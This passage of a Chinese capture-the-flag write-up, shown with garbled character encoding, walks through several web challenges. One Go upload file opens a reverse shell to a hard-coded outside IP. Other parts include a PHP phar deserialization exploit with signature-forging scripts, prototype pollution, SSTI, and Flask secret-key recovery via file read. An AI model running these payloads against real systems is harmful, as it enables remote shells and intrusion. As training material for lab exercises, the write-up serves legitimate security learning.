/><p>å‘ç°ä»–ä¼šæŠŠusernameçš„å€¼è®¾ç½®ä¸ºcookieï¼</p><p>åŒæ—¶é¡µé¢ä¹Ÿä¼šå›æ˜¾123.</p><p>cookieå¤„å¯èƒ½å­˜åœ¨ssti</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png" alt="image-20241221131100031" style="zoom: 67%;" /><p>å®é”¤äº†ï¼Œæƒ³åŠæ³•çœ‹å…¶ä»–ç›®å½•</p><p>è¿™é‡Œæƒ³äº†åŠå¤©ï¼Œçªç„¶æƒ³èµ·æ¥ï¼Œls &#x2F;æ˜¯ä¸€åˆ—ä¸€åˆ—è¾“å‡ºçš„ï¼Œæ‰€ä»¥è¿™é‡Œåªè¾“å‡ºäº†ç¬¬ä¸€è¡Œï¼Œæˆ‘ä»¬è®©ä»–æˆè¡Œè¾“å‡ºå³å¯ï¼</p><p>åˆšå¼€å§‹è¯•äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -m /   ä¸å¤ªè¡Œï¼Œåªæœ‰å‡ ä¸ª</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / | xargs   å¯ä»¥</span><br></pre></td></tr></table></figure><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png" alt="image-20241221132103107" style="zoom:67%;" /><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png" alt="image-20241221132132933" style="zoom:67%;" /><h2 id="NSSRound-8-Basic-Upload-gogoggo"><a href="#NSSRound-8-Basic-Upload-gogoggo" class="headerlink" title="[NSSRound#8 Basic]Upload_gogoggo"></a>[NSSRound#8 Basic]Upload_gogoggo</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png" alt="image-20241221210444624"></p><p>å°±ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„åŠŸèƒ½ç‚¹ï¼Œä¸Šä¼ è¯•è¯•</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png" alt="image-20241221210459298" style="zoom: 67%;" /><p>è¿™æ³¢â€¦.</p><p>go webshellï¼Ÿï¼Ÿgo helpï¼Ÿï¼Ÿï¼Ÿè¿™æ˜¯ç”¨goæ‰§è¡Œäº†æˆ‘çš„æ–‡ä»¶åå—ï¼Ÿ</p><p>ä¸Šä¼ æ–‡ä»¶åä¸ºhelpè¯•è¯•</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png" alt="image-20241221210551031" style="zoom: 67%;" /><p>è¿™æ˜¯ï¼Ÿï¼Ÿ</p><p>å‘½ä»¤æ‰§è¡Œ(go æ–‡ä»¶åå‰ç¼€ æ–‡ä»¶ä¸Šä¼ çš„è·¯å¾„)ï¼Ÿ</p><p>èƒ½ä¸èƒ½è®©ä»–go run goæ–‡ä»¶</p><p>go run run.goï¼Ÿï¼Ÿ</p><p>å¯ä»¥å—ï¼Ÿ</p><p>run.goæ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os/exec&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">cmd := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1&quot;</span>)</span><br><span class="line">out, err := cmd.CombinedOutput()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">log.Fatalf(<span class="string">&quot;cmd.Run() failed with %s\n&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;combined out:\n%s\n&quot;</span>, <span class="type">string</span>(out))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥å¼¹shell</p><p>æ ¹ç›®å½•ä¸‹æœ‰ä¸ªflaaaag   TlNTQ1QK</p><p>&#x2F;home&#x2F;galf    RntmY2ZjYjIwNS1kZjFhLTQ2NWYtODMzOC0wYzRhMjM2MDEzNmF9Cg&#x3D;&#x3D;</p><p>æŠ½è±¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;fcfcb205-df1a-465f-8338-0c4a2360136a&#125;</span><br></pre></td></tr></table></figure><h2 id="MoeCTF-2021-fake-game"><a href="#MoeCTF-2021-fake-game" class="headerlink" title="[MoeCTF 2021]fake game"></a>[MoeCTF 2021]fake game</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png" alt="image-20241222093337918"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png" alt="image-20241222093344765"></p><p>éšä¾¿å‘ä¸ªåŒ…ï¼Œæ­£å¸¸åˆ†é…å±æ€§è‚¯å®šæ˜¯ä¸è¡Œçš„ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png" alt="image-20241222093408857" style="zoom: 67%;" /><p>æç¤ºmergeï¼ŒåŸå‹é“¾æ±¡æŸ“ã€‚</p><p>å¦‚æœä½ å°†æŸä¸€é¡¹å±æ€§å€¼è®¾ä¸º0ï¼Œä½ å°†æ²¡æœ‰è¿™é¡¹å±æ€§ï¼</p><p>é‚£ä¹ˆæ±¡æŸ“protoï¼Œå½“å‰æ‰¾ä¸åˆ°å°±æ‰¾ä¹‹å‰çš„ï¼Œå®Œç¾äº†ã€‚</p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png" alt="image-20241222093449718" style="zoom:67%;" /><h2 id="NSSRound-13-Basic-ez-factors"><a href="#NSSRound-13-Basic-ez-factors" class="headerlink" title="[NSSRound#13 Basic]ez_factors"></a>[NSSRound#13 Basic]ez_factors</h2><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png" alt="image-20241222102504323"></p><p>å› æ•°åˆ†è§£</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png" alt="image-20241222102518573"></p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png" alt="image-20241222102526079"></p><p>å‘ç°åªèƒ½è¾“å‡ºæ•°å­—ã€‚</p><p>é‚£å°±ç”¨odï¼Œè¾“å‡ºå…«è¿›åˆ¶</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png" alt="image-20241222102639428"></p><h2 id="NSSRound-4-SWPU-1zweb-revenge"><a href="#NSSRound-4-SWPU-1zweb-revenge" class="headerlink" title="[NSSRound#4 SWPU]1zweb(revenge)"></a>[NSSRound#4 SWPU]1zweb(revenge)</h2><p>ä¸€é“pharååºåˆ—åŒ–é¢˜ï¼Œä½†æ˜¯è·Ÿä¹‹å‰åšçš„ä¸å¤ªä¸€æ ·</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png" alt="image-20241222111208334"></p><p>æœ‰ä¸¤ä¸ªåŠŸèƒ½ç‚¹</p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå…ˆè¯»å–index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;ljt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;dky&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®å°±æ˜¯è¦æ„é€ pharæ–‡ä»¶äº†ã€‚</p><p>å†è¯»å–upload.phpï¼ŒæŸ¥çœ‹ç›¸å…³è¿‡æ»¤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ å¼‚å¸¸&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$allowedExts</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$allowedExts</span>)))&#123;</span><br><span class="line">        <span class="variable">$content</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">        <span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$content</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">gettype</span>(<span class="variable">$pos</span>)===<span class="string">&quot;integer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ltjä¸€çœ¼å°±å‘ç°äº†phar&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;./upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; æ–‡ä»¶å·²ç»å­˜åœ¨&quot;</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&quot;w&quot;</span>);</span><br><span class="line">                <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>, <span class="variable">$content</span>);</span><br><span class="line">                <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;ä¸Šä¼ æˆåŠŸ ./upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;dkyä¸å–œæ¬¢è¿™ä¸ªæ–‡ä»¶ .&quot;</span>.<span class="variable">$extension</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°å­˜åœ¨å¯¹__HALT_COMPILER();çš„æ£€æµ‹ã€‚å¯ä»¥ç”¨ä¸¤ç§æ–¹æ³•æ¥ç»•è¿‡</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png" alt="image-20241222112240952"></p><p>æ¥å§ï¼Œå…ˆæ„é€ æ¶æ„pharæ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoveNss</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ljt</span>=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dky</span>=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&quot;system(&#x27;tac /f*&#x27;);&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ljt===<span class="string">&quot;Misc&quot;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;dky===<span class="string">&quot;Re&quot;</span>)</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ljt=<span class="string">&quot;Re&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dky=<span class="string">&quot;Misc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//å¼€å§‹å†™æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//å†™å…¥stub</span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">LoveNss</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„æ„é€ å®Œè¦ç”¨winhexæ”¹å±æ€§æ•°é‡ï¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line"> f = file.read()</span><br><span class="line">newf = gzip.compress(f) <span class="comment">#å¯¹Pharâ½‚ä»¶è¿›â¾gzipå‹ç¼©</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;capoo.gif&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:<span class="comment">#æ›´æ”¹â½‚ä»¶åç¼€</span></span><br><span class="line"> file.write(newf)</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png" alt="image-20241222112644143"></p><p>å°è¯•pharæ–‡ä»¶åŒ…å«ï¼Œä»–è¯´broken signatureï¼Œç­¾åæœ‰é—®é¢˜ï¼Ÿï¼</p><p>å½“æˆ‘ä»¬æ›´æ”¹test.pharæ–‡ä»¶çš„å†…å®¹æ—¶ï¼Œç­¾åä¼šå˜å¾—æ— æ•ˆï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ¢ä¸€ä¸ªç­¾åï¼</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png" alt="image-20241222112807470"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read()</span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># è·å–è¦ç­¾åçš„æ•°æ®</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># è·å–ç­¾åç±»å‹å’ŒGBMBæ ‡è¯†</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># æ•°æ® + ç­¾å + (ç±»å‹ + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># å†™å…¥æ–°æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png" alt="image-20241222113111949"></p><p>æ‹¿æäº†ï¼</p><h2 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><p>å¼€å±€å‘ç°ä»»æ„æ–‡ä»¶è¯»å–</p><p>pythonç½‘ç«™ï¼Œé‚£å°±ç›´æ¥è¯»æºç ã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png" alt="image-20241222161153662"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">str</span>(ex)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=<span class="literal">True</span>,</span><br><span class="line">        host=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>æ€è·¯å°±æ˜¯æ”¹sessionã€‚</p><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png" alt="image-20241222161704265"></p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png" alt="image-20241222161718945" style="zoom:67%;" /><p>æ¥ä¸‹æ¥å¦‚æœæˆ‘ä»¬èƒ½è·å–åˆ°secret_keyé‚£å°±å¤§åŠŸå‘Šæˆäº†ã€‚</p><p>ç„¶åæˆ‘å‘ç°äº†ä¸€ä¸ªè§£é¢˜å…³é”®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>åªè¦æˆ‘ä»¬è·å–åˆ°uuid.getnode()ï¼Œé‚£ä¹ˆå°±çŸ¥é“ç§å­äº†ï¼Œå°±å¯ä»¥çŸ¥é“secret_keyäº†.</p><p>uuid.getnode()è¿”å›è®¡ç®—æœºçš„<strong>ç½‘ç»œæ¥å£å¡ï¼ˆNICï¼‰åœ°å€</strong>ï¼Œé€šå¸¸æ˜¯è®¾å¤‡çš„ MAC åœ°å€ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sys/class/net/eth0/address</span><br></pre></td></tr></table></figure><p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png" alt="image-20241222162400463"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:82:0a</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å‰é¢å†™åˆ°è¿‡å•Šæˆ‘ä¸¢ï¼Œçªç„¶æ„è¯†åˆ°ã€‚</p><figure class="highlight 